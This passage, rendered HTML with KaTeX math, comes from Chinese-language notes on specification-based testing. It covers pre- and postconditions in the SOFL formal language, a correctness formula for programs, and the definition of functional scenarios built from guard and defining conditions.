class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">os</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span></eq><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>i</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{iv}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>: 在操作后输入变量中未改变的值</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{ov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>: 在操作后操作产生或修改的值</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mtext>，</mtext><msub><mi>S</mi><mrow><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{pre}，S_{post}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">os</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>: 操作的前置，后置条件（为简化问题，假设相关的不变量已经并入前置和后置条件中，并且前置和后置条件都不含量化表达式）</li></ul></li><li>为了编写操作的前置和后置条件，采用了机构化面向形式语言SOFL[28]，其整合了VDM-SL[29]和数据刘图。</li><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 为实现操作 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 的程序,为了确保 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 实现正确，应保证 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">∀</mi><mrow><mi>σ</mi><mo>∈</mo><mo>∑</mo></mrow></msub><mo separator="true">⋅</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo stretchy="false">(</mo><mi>σ</mi><mo stretchy="false">)</mo><mo>⇒</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi></mrow></msub><mo stretchy="false">(</mo><mi>σ</mi><mo separator="true">,</mo><mi>P</mi><mo stretchy="false">(</mo><mi>σ</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>（</mtext><mn>1</mn><mtext>）</mtext></mrow><annotation encoding="application/x-tex">\forall_{\sigma \in \sum } · S_{pre}(\sigma) \Rightarrow  S_{post}(\sigma,P(\sigma)) （1）</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord">∀</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="mrel mtight">∈</span><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">∑</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">os</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mclose">))</span><span class="mord cjk_fallback">（</span><span class="mord">1</span><span class="mord cjk_fallback">）</span></span></span></span></span></eqn></section>,其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span></span></span></span></eq> 表示 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 所有可能的状态，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 可以看作程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq> 的一种抽象，其总体上是一个状态转换系统,像一个函数，从初始状态映射到结束状态。该公式成立需要满足条件，所有初始状态 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></eq> 都满足 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{pre}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq> 时，最终状态状态 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></eq> 下的输出满足 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{post}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">os</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>理论上，使用测试验证公式（1）需要穷尽测试，尝试 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 所有可能的输入，这是不现实的。我们的方法旨在对specification <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq> 生成足够的测试用例，以覆盖用户独特功能需求中所定义的所有功能。这样的功能可以由下面的功能场景定义给出。</li></ul><h5 id="definition-1%3Afunctional-scenario" tabindex="-1">Definition 1:functional scenario</h5><ul><li>令 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>o</mi><mi>s</mi><mi>t</mi></mrow></msub><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>G</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∨</mo><mo stretchy="false">(</mo><msub><mi>G</mi><mn>2</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∨</mo><mo stretchy="false">(</mo><msub><mi>G</mi><mi>n</mi></msub><mo>∧</mo><msub><mi>D</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_{post} \equiv (G_1 \wedge D_1) \vee (G_2 \wedge D_2).. \vee(G_n \wedge D_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">os</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">..</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>,其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>i</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">}</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G_i(i \in \{1,...,n\})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">})</span></span></span></span></eq> 表示一个成为守卫条件的谓词，不包含在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{ov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的输出中， <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">D_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 是一个定义的条件包括至少一个在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{ov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 中的输出变量，但不包含守卫条件。 然后，一个功能场景的定义为一个合取 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mi>i</mi></msub><mo>∧</mo><msub><mi>D</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_{pre} \wedge G_i \wedge D_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,同时 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∨</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mn>2</mn></msub><mo>∧</mo><msub><mi>D</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∨</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∨</mo><mo stretchy="false">(</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo>∧</mo><msub><mi>G</mi><mi>n</mi></msub><mo>∧</mo><msub><mi>D</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(S_{pre} \wedge G_1 \wedge D_1) \vee (S_{pre} \wedge G_2 \wedge D_2) \vee ... \vee (S_{pre} \wedge G_n \wedge D_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" 